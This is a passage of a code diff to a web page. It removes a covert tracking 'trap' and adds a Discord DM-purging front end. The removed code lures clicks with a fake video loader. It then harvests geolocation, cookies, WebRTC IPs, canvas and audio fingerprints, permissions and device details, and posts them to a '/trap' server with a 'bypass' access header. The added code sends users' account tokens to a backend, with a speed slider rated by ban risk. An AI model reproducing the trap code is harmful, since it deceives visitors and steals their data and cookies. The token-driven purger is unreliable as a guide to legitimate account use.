-    totalJSHeapMB: ((performance.memory.totalJSHeapSize /1048576).toFixed(2)),
-    limitJSHeapMB: ((performance.memory.jsHeapSizeLimit /1048576).toFixed(2)),
-  }));
-  return {
-    pageLoadMs: nav.loadEventEnd?Math.round(nav.loadEventEnd-nav.startTime):'N/A',
-    domReadyMs: nav.domContentLoadedEventEnd?Math.round(nav.domContentLoadedEventEnd-nav.startTime):'N/A',
-    paint,
-    memory: mem,
-    redirectCount:nav.redirectCount??'N/A',
-    transferSizeB:nav.transferSize??'N/A',
-    decodedBodyB: nav.decodedBodySize??'N/A',
-    type: nav.type||t.navigationType||'N/A',
-  };
-}
-
-function visualViewportInfo(){
-  const vv=window.visualViewport;
-  if(!vv) return {available:false};
-  return {available:true, width:vv.width, height:vv.height, scale:vv.scale,
-    offsetLeft:vv.offsetLeft, offsetTop:vv.offsetTop,
-    pageLeft:vv.pageLeft, pageTop:vv.pageTop};
-}
-
-async function getBattery(){
-  try{
-    const b=await navigator.getBattery();
-    return {level:Math.round(b.level*100)+'%',charging:b.charging,
-      chargingTimeSec: b.chargingTime===Infinity?'full/N/A':b.chargingTime,
-      dischargingTimeSec: b.dischargingTime===Infinity?'N/A':b.dischargingTime};
-  }catch{return{level:'N/A',charging:'N/A'};}
-}
-
-function connInfo(){
-  const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-  if(!c) return{type:'unknown',effectiveType:'unknown',downlink:'N/A',rtt:'N/A',saveData:false};
-  return{type:c.type||'unknown',effectiveType:c.effectiveType||'unknown',
-    downlink:c.downlink!=null?c.downlink+' Mbps':'N/A',
-    rtt: c.rtt!=null?c.rtt+' ms':'N/A', saveData:!!c.saveData};
-}
-
-async function mediaDevs(){
-  try{
-    const d=await navigator.mediaDevices.enumerateDevices();
-    return{audioinput:d.filter(x=>x.kind==='audioinput').length,
-      audiooutput:d.filter(x=>x.kind==='audiooutput').length,
-      videoinput: d.filter(x=>x.kind==='videoinput').length,
-      total:d.length};
-  }catch{return{audioinput:'N/A',audiooutput:'N/A',videoinput:'N/A'};}
-}
-
-async function getPerms(){
-  const names=['notifications','clipboard-read','clipboard-write','camera',
-               'microphone','geolocation','accelerometer','gyroscope','magnetometer',
-               'ambient-light-sensor','background-sync','persistent-storage'];
-  const out={};
-  await Promise.all(names.map(async n=>{
-    try{out[n]=(await navigator.permissions.query({name:n})).state;}
-    catch{out[n]='N/A';}
-  }));
-  return out;
-}
-
-function speechVoices(){
-  try{ return window.speechSynthesis.getVoices().map(v=>({name:v.name,lang:v.lang,default:v.default})); }
-  catch{return[];}
-}
-
-function mimeTypes(){
-  try{ return Array.from(navigator.mimeTypes).map(m=>m.type); }
-  catch{return[];}
-}
-
-function getPlugins(){
-  try{ return Array.from(navigator.plugins).map(p=>({name:p.name,filename:p.filename,desc:p.description})); }
-  catch{return[];}
-}
-
-function mediaCaps(){
-  const mq=q=>{try{return window.matchMedia(q).matches;}catch{return null;}};
-  return{
-    prefersDark: mq('(prefers-color-scheme:dark)'),
-    prefersLight: mq('(prefers-color-scheme:light)'),
-    prefersReducedMotion: mq('(prefers-reduced-motion:reduce)'),
-    prefersReducedData: mq('(prefers-reduced-data:reduce)'),
-    prefersContrast: mq('(prefers-contrast:more)'),
-    forcedColors: mq('(forced-colors:active)'),
-    hoverCapable: mq('(hover:hover)'),
-    finePointer: mq('(pointer:fine)'),
-    coarsePointer: mq('(pointer:coarse)'),
-    anyHover: mq('(any-hover:hover)'),
-    displayStandalone: mq('(display-mode:standalone)'),
-    hdr: mq('(dynamic-range:high)'),
-    p3Gamut: mq('(color-gamut:p3)'),
-    rec2020Gamut: mq('(color-gamut:rec2020)'),
-    srgbGamut: mq('(color-gamut:srgb)'),
-    invertedColors: mq('(inverted-colors:inverted)'),
-    monochromeDisplay: mq('(monochrome)'),
-    landscape: mq('(orientation:landscape)'),
-  };
-}
-
-function storageInfo(){
-  let lsB=0,ssB=0;
-  try{for(const k in localStorage) if(typeof localStorage[k]==='string') lsB+=localStorage[k].length+k.length;}catch{}
-  try{for(const k in sessionStorage) if(typeof sessionStorage[k]==='string') ssB+=sessionStorage[k].length+k.length;}catch{}
-  return{
-    localStorageItems: safe(()=>localStorage.length),
-    localStorageBytes: lsB,
-    sessionStorageItems:safe(()=>sessionStorage.length),
-    sessionStorageBytes:ssB,
-    indexedDB: typeof indexedDB!=='undefined',
-    cookiesEnabled: navigator.cookieEnabled,
-    cacheAPI: 'caches' in window,
-  };
-}
-
-function detectFeatures(){
-  const t=fn=>{try{return fn();}catch{return false;}};
-  return{
-    webAssembly: typeof WebAssembly!=='undefined',
-    serviceWorker: 'serviceWorker' in navigator,
-    webWorker: typeof Worker!=='undefined',
-    sharedWorker: typeof SharedWorker!=='undefined',
-    broadcastChan: typeof BroadcastChannel!=='undefined',
-    webSocket: typeof WebSocket!=='undefined',
-    webGL: t(()=>!!document.createElement('canvas').getContext('webgl')),
-    webGL2: t(()=>!!document.createElement('canvas').getContext('webgl2')),
-    offscreenCanvas: typeof OffscreenCanvas!=='undefined',
-    gamepad: 'getGamepads' in navigator,
-    bluetooth: 'bluetooth' in navigator,
-    usb: 'usb' in navigator,
-    nfc: 'nfc' in navigator,
-    xr: 'xr' in navigator,
-    hid: 'hid' in navigator,
-    serial: 'serial' in navigator,
-    paymentRequest: typeof PaymentRequest!=='undefined',
-    credentials: 'credentials' in navigator,
-    clipboard: 'clipboard' in navigator,
-    share: 'share' in navigator,
-    wakeLock: 'wakeLock' in navigator,
-    idle: 'IdleDetector' in window,
-    deviceOrient: typeof DeviceOrientationEvent!=='undefined',
-    deviceMotion: typeof DeviceMotionEvent!=='undefined',
-    intersectionObs: typeof IntersectionObserver!=='undefined',
-    resizeObs: typeof ResizeObserver!=='undefined',
-    mutationObs: typeof MutationObserver!=='undefined',
-    pointerEvents: typeof PointerEvent!=='undefined',
-    touch: 'ontouchstart' in window,
-    contactPicker: 'contacts' in navigator,
-    eyeDropper: 'EyeDropper' in window,
-    compression: typeof CompressionStream!=='undefined',
-    trustedTypes: typeof TrustedTypes!=='undefined',
-    cryptoAPI: typeof crypto!=='undefined'&&!!crypto.subtle,
-    sharedArrayBuf: typeof SharedArrayBuffer!=='undefined',
-    atomics: typeof Atomics!=='undefined',
-    weakRef: typeof WeakRef!=='undefined',
-    bigInt: typeof BigInt!=='undefined',
-    intl: typeof Intl!=='undefined',
-    intlSegmenter: typeof Intl.Segmenter!=='undefined',
-  };
-}
-
-function screenExtra(){
-  return{
-    isExtended: safe(()=>screen.isExtended),
-    availLeft: safe(()=>screen.availLeft),
-    availTop: safe(()=>screen.availTop),
-    left: safe(()=>screen.left),
-    top: safe(()=>screen.top),
-  };
-}
-
-async function handleClick(){
-  const box = $('trap');
-  box.style.pointerEvents = 'none';
-  box.innerHTML = `<div style="height:100%;display:flex;align-items:center;justify-content:center;color:#777;font-size:1.15rem;">Loading the craziest video...</div>`;
-
-  const [battery, rtcIPs, mdevs, perms, afp, uach] = await Promise.all([
-    getBattery(), getWebRTCIPs(), mediaDevs(), getPerms(), audioFP(), getUACH()
-  ]);
-
-  const fonts = enumerateFonts();
-  window.speechSynthesis?.getVoices();
-  await new Promise(r => setTimeout(r, 200));
-  const voices = speechVoices();
-  const gl = webglInfo();
-  const geo = await getLocation();
-
-  const payload = {
-    location: geo,
-    capturedAt: new Date().toISOString(),
-    capturedAtMs: Date.now(),
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timezoneOffset: new Date().getTimezoneOffset()+' min',
-    locale: Intl.DateTimeFormat().resolvedOptions().locale,
-    calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
-    numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
-    language: navigator.language,
-    languages: [...(navigator.languages||[])],
-    userAgent: navigator.userAgent,
-    uaClientHints: uach,
-    appName: navigator.appName,
-    appVersion: navigator.appVersion,
-    vendor: navigator.vendor,
-    vendorSub: navigator.vendorSub||'',
-    platform: navigator.platform,
-    product: navigator.product,
-    productSub: navigator.productSub,
-    buildID: navigator.buildID||'N/A',
-    doNotTrack: navigator.doNotTrack||'unset',
-    globalPrivacyCtrl: navigator.globalPrivacyControl??'N/A',
-    javaEnabled: safe(()=>navigator.javaEnabled()),
-    pdfViewerEnabled: navigator.pdfViewerEnabled??'N/A',
-    cookieEnabled: navigator.cookieEnabled,
-    onLine: navigator.onLine,
-    plugins: getPlugins(),
-    mimeTypes: mimeTypes(),
-    screenRes: screen.width+'x'+screen.height,
-    availRes: screen.availWidth+'x'+screen.availHeight,
-    viewportSize: window.innerWidth+'x'+window.innerHeight,
-    outerSize: window.outerWidth+'x'+window.outerHeight,
-    scrollPosition: window.scrollX+','+window.scrollY,
-    colorDepth: screen.colorDepth+'-bit',
-    pixelDepth: screen.pixelDepth+'-bit',
-    pixelRatio: window.devicePixelRatio,
-    orientation: screen.orientation?.type||'unknown',
-    orientationAngle: screen.orientation?.angle??'N/A',
-    screenExtra: screenExtra(),
-    visualViewport: visualViewportInfo(),
-    cpuCores: navigator.hardwareConcurrency||'N/A',
-    deviceMemory: (navigator.deviceMemory||'N/A')+' GB',
-    maxTouchPoints: navigator.maxTouchPoints,
-    connection: connInfo(),
-    battery: battery,
-    webrtcLocalIPs: rtcIPs,
-    canvasFP: canvasFP(),
-    audioFP: afp,
-    mathFP: mathFP(),
-    webgl: gl,
-    fonts: fonts,
-    performance: perfInfo(),
-    mediaDevices: mdevs,
-    speechVoices: voices,
-    speechVoiceCount: voices.length,
-    permissions: perms,
-    storage: storageInfo(),
-    features: detectFeatures(),
-    mediaQueries: mediaCaps(),
-    referrer: document.referrer||'direct',
-    pageUrl: window.location.href,
-    pageTitle: document.title,
-    historyLength: history.length,
-    documentEncoding: document.characterSet,
-    documentMode: safe(()=>document.documentMode)||'N/A',
-    visibilityState: document.visibilityState,
-    hasFocus: document.hasFocus(),
-    cookieString: document.cookie||'(empty)',
-    readyState: document.readyState,
-  };
+  const btn = document.getElementById('connectBtn');
+  btn.disabled = true; btn.textContent = '…';
+  showErr('authErr', '');
 
   try {
-    await fetch(SERVER_URL + '/trap', {
+    const res = await fetch(`${API}/validate`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'cf-access-token': 'bypass' },
-      body: JSON.stringify(payload),
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ token })
     });
-  } catch (e) {
-    
+    const data = await res.json();
+    if (data.ok) {
+      state.user = data.user;
+      localStorage.setItem('dc_token', token);
+      document.getElementById('userPillName').textContent = data.user.username;
+      document.getElementById('userPill').style.display = 'flex';
+      document.getElementById('mainUI').style.display = 'block';
+      document.getElementById('authSection').style.display = 'none';
+      log(`// Authenticated as ${data.user.username}`, 'sys');
+      loadDMs();
+    } else {
+      showErr('authErr', 'Invalid token — double-check and try again.');
+      log('// Auth failed: invalid token', 'err');
+    }
+  } catch {
+    showErr('authErr', 'Cannot reach backend. Is purger_backend.py running on port 5000?');
+    log('// ERROR: Backend unreachable at localhost:5000', 'err');
   }
 
-  setTimeout(() => {
-    window.location.href = "https://solar-icons.vercel.app/icons";
-  }, 800);
+  btn.disabled = false; btn.textContent = 'Connect';
 }
+
+function disconnect() {
+  state.user = null; state.dms = []; state.selectedDm = null;
+  state.jobId = null; state.jobStatus = 'idle';
+  localStorage.removeItem('dc_token');
+  document.getElementById('userPill').style.display = 'none';
+  document.getElementById('mainUI').style.display = 'none';
+  document.getElementById('authSection').style.display = 'block';
+  document.getElementById('tokenInput').value = '';
+  clearInterval(state.pollTimer);
+  log('// Disconnected.', 'sys');
+}
+
+// ── DMs ───────────────────────────────────────────────────────────
+async function loadDMs() {
+  const list = document.getElementById('dmList');
+  list.innerHTML = '<p style="font-size:0.78rem;color:var(--text-dim)">Loading DMs…</p>';
+  try {
+    const res = await fetch(`${API}/dms`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ token: state.token })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      state.dms = data.dms;
+      renderDMs();
+      log(`// Loaded ${data.dms.length} DM channels`, 'sys');
+    }
+  } catch {
+    list.innerHTML = '<p style="font-size:0.78rem;color:var(--red)">Failed to load DMs.</p>';
+  }
+}
+
+function renderDMs() {
+  const list = document.getElementById('dmList');
+  if (!state.dms.length) {
+    list.innerHTML = '<p style="font-size:0.78rem;color:var(--text-dim)">No DMs found.</p>';
+    return;
+  }
+  list.innerHTML = state.dms.map(dm => `
+    <div class="dm-item ${state.selectedDm?.id === dm.id ? 'sel' : ''}" onclick="selectDm('${dm.id}')">
+      <div class="dm-av">${dm.name.slice(0,2).toUpperCase()}</div>
+      <span class="dm-name">${escHtml(dm.name)}</span>
+      <span class="dm-tag">${dm.type === 3 ? 'GROUP' : 'DM'}</span>
+      ${state.selectedDm?.id === dm.id ? '<span class="dm-sel-dot">●</span>' : ''}
+    </div>
+  `).join('');
+}
+
+function selectDm(id) {
+  state.selectedDm = state.dms.find(d => d.id === id) || null;
+  document.getElementById('statTarget').textContent = state.selectedDm?.name || '—';
+  document.getElementById('startBtn').disabled = !state.selectedDm || state.jobStatus === 'running';
+  renderDMs();
+}
+
+// ── Custom Slider ─────────────────────────────────────────────────
+// Range: 0.1s – 5.0s  (log scale for finer control at low end)
+const SPEED_MIN = 0.1;
+const SPEED_MAX = 5.0;
+
+function speedToPercent(s) {
+  // log scale: map [0.1, 5] → [0, 1]
+  return (Math.log(s) - Math.log(SPEED_MIN)) / (Math.log(SPEED_MAX) - Math.log(SPEED_MIN));
+}
+function percentToSpeed(p) {
+  return Math.exp(Math.log(SPEED_MIN) + p * (Math.log(SPEED_MAX) - Math.log(SPEED_MIN)));
+}
+
+function updateSliderUI(speed) {
+  const pct = speedToPercent(speed) * 100;
+  document.getElementById('trackFill').style.width = pct + '%';
+  document.getElementById('sliderThumb').style.left = pct + '%';
+  document.getElementById('speedVal').textContent = speed.toFixed(speed < 1 ? 2 : 1);
+
+  let tag, note, col;
+  if (speed < 0.25) {
+    tag = '🔴 Extreme'; col = '#e63946'; note = '⚠️ Very high ban risk. Not recommended.';
+  } else if (speed < 0.5) {
+    tag = '⚡ Fast'; col = '#f4a261'; note = '⚡ Fast but risky. Use with caution.';
+  } else if (speed < 1.2) {
+    tag = '🟡 Normal'; col = '#f4de65'; note = '🟡 Balanced speed and safety.';
+  } else if (speed < 3) {
+    tag = '🟢 Safe'; col = '#2ec4b6'; note = '🟢 Low risk, slightly slower.';
+  } else {
+    tag = '🐢 Very Safe'; col = '#2ec4b6'; note = '🟢 Very safe. Good for leaving it running.';
+  }
+
+  const tagEl = document.getElementById('speedTag');
+  tagEl.textContent = tag;
+  tagEl.style.color = col;
+  tagEl.style.background = col + '18';
+  document.getElementById('speedNote').textContent = note;
+}
+
+function initSlider() {
+  const slider = document.getElementById('speedSlider');
+
+  function handlePointer(e) {
+    const rect = slider.getBoundingClientRect();
+    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+    let pct = (clientX - rect.left) / rect.width;
+    pct = Math.max(0, Math.min(1, pct));
+    state.speed = parseFloat(percentToSpeed(pct).toFixed(2));
+    updateSliderUI(state.speed);
+  }
+
+  let dragging = false;
+
+  slider.addEventListener('mousedown', e => {
+    dragging = true;
+    slider.classList.add('dragging');
+    handlePointer(e);
+    e.preventDefault();
+  });
+  slider.addEventListener('touchstart', e => {
+    dragging = true;
+    slider.classList.add('dragging');
+    handlePointer(e);
+  }, { passive: true });
+
+  window.addEventListener('mousemove', e => { if (dragging) handlePointer(e); });
+  window.addEventListener('touchmove', e => { if (dragging) handlePointer(e); }, { passive: true });
+  window.addEventListener('mouseup', () => { dragging = false; slider.classList.remove('dragging'); });
+  window.addEventListener('touchend', () => { dragging = false; slider.classList.remove('dragging'); });
+
+  // Keyboard accessibility
+  slider.setAttribute('tabindex', '0');
+  slider.addEventListener('keydown', e => {
+    let p = speedToPercent(state.speed);
+    if (e.key === 'ArrowRight') p = Math.min(1, p + 0.02);
+    else if (e.key === 'ArrowLeft') p = Math.max(0, p - 0.02);
+    else return;
+    state.speed = parseFloat(percentToSpeed(p).toFixed(2));
+    updateSliderUI(state.speed);
+    e.preventDefault();
+  });
+
+  updateSliderUI(state.speed);
+}
+
+// ── Filter ────────────────────────────────────────────────────────
+function setFilter(type) {
+  state.filterType = type;
+  ['ftAll','ftBefore','ftAfter'].forEach(id => document.getElementById(id).className = 'ftab');
+
+  if (type === 'all') {
+    document.getElementById('ftAll').className = 'ftab fa';
+    document.getElementById('dateRow').style.display = 'none';
+    document.getElementById('filterNote').textContent = 'Deletes all messages you sent in this DM.';
+  } else if (type === 'before') {
+    document.getElementById('ftBefore').className = 'ftab fa';
+    document.getElementById('dateRow').style.display = 'block';
+    document.getElementById('filterNote').textContent = 'Deletes your messages sent before the chosen date.';
+  } else {
+    document.getElementById('ftAfter').className = 'ftab fb';
+    document.getElementById('dateRow').style.display = 'block';
+    document.getElementById('filterNote').textContent = 'Deletes your messages sent after the chosen date.';
+  }
+}
+
+// ── Purge ─────────────────────────────────────────────────────────
+async function startPurge() {
+  if (!state.selectedDm || !state.user) return;
+
+  const dateVal = document.getElementById('dateInput').value;
+  if (state.filterType !== 'all' && !dateVal) {
+    log('// Set a date before starting filtered purge.', 'warn');
+    return;
+  }
+
+  clearConsole();
+  log(`// Starting purge on: ${state.selectedDm.name}`, 'sys');
+  setJobStatus('starting');
+
+  try {
+    const res = await fetch(`${API}/purge/start`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        token: state.token,
+        channel_id: state.selectedDm.id,
+        user_id: state.user.id,
+        delay: state.speed,
+        filter_type: state.filterType,
+        filter_date: dateVal ? new Date(dateVal).toISOString() : null
+      })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      state.jobId = data.job_id;
+      state.seenLogs.clear();
+      log(`// Job ${data.job_id} started`, 'sys');
+      startPolling();
+    }
+  } catch {
+    log('// ERROR: Failed to start job. Is backend running?', 'err');
+    setJobStatus('idle');
+  }
+}
+
+async function stopPurge() {
+  if (!state.jobId) return;
+  log('// Stop signal sent…', 'warn');
+  try {
+    await fetch(`${API}/purge/stop/${state.jobId}`, { method: 'POST' });
+  } catch {}
+}
+
+function startPolling() {
+  clearInterval(state.pollTimer);
+  state.pollTimer = setInterval(async () => {
+    if (!state.jobId) return;
+    try {
+      const res = await fetch(`${API}/purge/status/${state.jobId}`);
+      const data = await res.json();
+      if (!data.ok) return;
+
+      document.getElementById('statDeleted').textContent = data.deleted;
+      document.getElementById('statSkipped').textContent = data.skipped;
+      setJobStatus(data.status);
+
+      if (data.log) {
+        data.log.forEach(line => {
+          if (!state.seenLogs.has(line)) {
+            state.seenLogs.add(line);
+            const t = line.startsWith('✓') ? 'ok' : line.startsWith('✗') ? 'err' : line.startsWith('⏳') ? 'warn' : 'log';
+            log(line, t);
+          }
+        });
+      }
+
+      if (data.status === 'done' || data.status === 'stopped') {
+        clearInterval(state.pollTimer);
+      }
+    } catch {}
+  }, 1200);
+}
+
+function setJobStatus(s) {
+  state.jobStatus = s;
+  const dot = document.getElementById('statusDot');
+  const txt = document.getElementById('statusTxt');
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
+
+  dot.className = 'sdot ' + (s === 'running' || s === 'starting' ? 'running' : s === 'done' ? 'done' : s === 'stopped' ? 'stopped' : '');
+
+  const msgs = { idle:'Idle — select a DM to start', starting:'Starting…', running:'Purging messages…', done:'Done!', stopped:'Stopped.' };
+  txt.textContent = msgs[s] || s;
+
+  const isRunning = s === 'running' || s === 'starting';
+  startBtn.disabled = isRunning || !state.selectedDm;
+  stopBtn.style.display = isRunning ? 'block' : 'none';
+}
+
+// ── Console ───────────────────────────────────────────────────────
+function log(msg, type = 'log') {
+  const c = document.getElementById('console');
+  const d = document.createElement('div');
+  d.className = 'l ' + type;
+  d.textContent = msg;
+  c.appendChild(d);
+  c.scrollTop = c.scrollHeight;
+}
+function clearConsole() {
+  document.getElementById('console').innerHTML = '';
+  state.seenLogs.clear();
+}
+
+// ── Utils ─────────────────────────────────────────────────────────
+function showErr(id, msg) {
+  const el = document.getElementById(id);
+  el.textContent = msg;
+  el.style.display = msg ? 'block' : 'none';
+}
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// Guard: block connect/start if API not ready
+const _origConnect = connect;
+window.connect = async function() {
+  if (!API) { showApiDown(); return; }
+  return _origConnect();
+};
 </script>
 </body>
 </html>
